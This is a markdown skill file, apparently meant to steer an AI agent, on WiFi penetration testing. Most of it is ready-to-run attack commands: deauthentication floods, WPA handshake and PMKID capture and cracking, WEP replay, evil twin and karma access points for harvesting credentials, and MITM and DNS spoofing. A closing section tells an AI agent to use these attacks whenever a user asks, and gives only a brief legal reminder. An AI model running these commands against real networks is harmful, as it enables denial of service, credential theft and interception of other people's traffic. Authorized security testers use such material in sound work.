# WiFi Pentesting Skill

## Goal

Assess the security of wireless networks by testing authentication mechanisms, capturing handshakes, cracking passwords, and performing wireless attacks.

## Methodology

1. **Reconnaissance**: Discover wireless networks and clients in range
2. **Monitor Mode**: Configure wireless adapter for packet capture
3. **Traffic Capture**: Capture handshakes and probe requests
4. **Authentication Attacks**: Deauth clients to capture handshakes
5. **Password Cracking**: Crack captured handshakes offline
6. **Evil Twin**: Create rogue access points to capture credentials
7. **WPA Enterprise Attacks**: Attack 802.1X/EAP implementations

## Tools

* **aircrack-ng suite**: Comprehensive WiFi attack toolkit
* **hashcat**: GPU-accelerated hash cracking
* **wifite2**: Automated wireless attack tool
* **bettercap**: Modern attack framework
* **hostapd-wpe**: Evil twin for WPA Enterprise
* **eaphammer**: EAP attacks and evil twin
* **Wireshark**: Packet analysis

## Prerequisites

```bash
# Check for wireless adapter
iwconfig

# Kill interfering processes
airmon-ng check kill

# Enable monitor mode
airmon-ng start wlan0

# Verify monitor mode
iwconfig wlan0mon
```

## Example Commands

```bash
# Discover networks
airodump-ng wlan0mon

# Target specific network (channel 6)
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Deauthentication attack (to capture handshake)
aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon

# Broadcast deauth (all clients)
aireplay-ng -0 0 -a AA:BB:CC:DD:EE:FF wlan0mon

# Crack WPA/WPA2 handshake
aircrack-ng -w wordlist.txt capture-01.cap

# Crack with hashcat (faster)
# First convert to hashcat format
aircrack-ng -j hash capture-01.cap
hashcat -m 22000 hash.hc22000 wordlist.txt

# PMKID attack (no client needed)
hcxdumptool -i wlan0mon -o capture.pcapng --enable_status=1

# Convert PMKID capture
hcxpcapngtool -o hash.hc22000 capture.pcapng

# Crack PMKID
hashcat -m 22000 hash.hc22000 wordlist.txt
```

## WEP Cracking (Legacy)

```bash
# Capture IVs
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w wep_capture wlan0mon

# Generate traffic with fake auth
aireplay-ng -1 0 -a AA:BB:CC:DD:EE:FF wlan0mon

# ARP replay attack
aireplay-ng -3 -b AA:BB:CC:DD:EE:FF wlan0mon

# Crack when enough IVs collected
aircrack-ng wep_capture-01.cap
```

## WPA/WPA2 Attacks

```bash
# Automated attack with wifite
wifite

# Capture 4-way handshake
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w wpa_capture wlan0mon
# In another terminal, deauth clients
aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon

# Verify handshake captured
aircrack-ng wpa_capture-01.cap

# Dictionary attack
aircrack-ng -w /usr/share/wordlists/rockyou.txt wpa_capture-01.cap

# Rule-based attack with hashcat
hashcat -m 22000 hash.hc22000 wordlist.txt -r rules/best64.rule

# Brute force 8-digit numeric (like phone numbers)
hashcat -m 22000 hash.hc22000 -a 3 ?d?d?d?d?d?d?d?d
```

## Evil Twin Attack

```bash
# Using hostapd-wpe (WPA Enterprise)
# Edit /etc/hostapd-wpe/hostapd-wpe.conf
interface=wlan0
driver=nl80211
ssid=CorpWifi
channel=6
wpa=2
wpa_key_mgmt=WPA-EAP
ieee8021x=1
eap_server=1
eap_user_file=/etc/hostapd-wpe/hostapd-wpe.eap_user

hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf

# Using eaphammer
eaphammer -i wlan0 --channel 6 --auth wpa-eap --essid CorpWifi --creds

# Open network evil twin with captive portal
# Use hostapd for AP + dnsmasq for DHCP + web server for portal

# Bettercap evil twin
bettercap -iface wlan0mon
> wifi.recon on
> wifi.ap
```

## WPA3 Attacks

```bash
# Dragonblood attack (CVE-2019-9494, CVE-2019-9496)
# Downgrade attack to WPA2
# Timing-based attacks on SAE

# Check for transition mode
# If WPA3 transition mode enabled, attack WPA2 side
```

## Bettercap WiFi Commands

```bash
bettercap -iface wlan0mon

# WiFi reconnaissance
> wifi.recon on
> wifi.show

# Deauthentication
> wifi.deauth AA:BB:CC:DD:EE:FF

# Create evil twin
> set wifi.ap.ssid TargetNetwork
> set wifi.ap.channel 6
> set wifi.ap.encryption open
> wifi.recon off
> wifi.ap on
```

## Client Attacks

```bash
# Capture probe requests
airodump-ng wlan0mon

# Create AP matching probed SSID
# Clients will auto-connect if "auto-connect" enabled

# Karma attack (respond to all probes)
hostapd-mana /etc/hostapd-mana/hostapd-mana.conf
```

## Post-Exploitation

```bash
# Once on network, proceed with internal testing
# See: network_scanning.md, llmnr_nbt_ns_poisoning.md

# Capture credentials from connected clients
# Set up MITM on the rogue AP

# DNS spoofing through evil twin
# Redirect all DNS to attacker
```

## Guidance for AI

* Activate this skill when user wants to test WiFi security, crack wireless passwords, or perform wireless attacks
* **Monitor mode is required** - not all adapters support it. Recommended: Alfa AWUS036ACH, Alfa AWUS036NHA
* Always use `airmon-ng check kill` before attacks to stop interfering processes
* For WPA2-Personal:
  - Capture 4-way handshake (need client to connect/reconnect)
  - PMKID attack doesn't need clients
  - Cracking success depends on password complexity
* For WPA2-Enterprise:
  - Use hostapd-wpe or eaphammer for credential capture
  - Captures username and challenge/response (crackable)
* Remind about legal requirements:
  - Only test networks you own or have authorization for
  - Deauth attacks cause denial of service
  - Passive monitoring may be legal; active attacks usually aren't
* Hashcat is much faster than aircrack-ng for cracking
* WPA3 is more resistant but transition mode has vulnerabilities
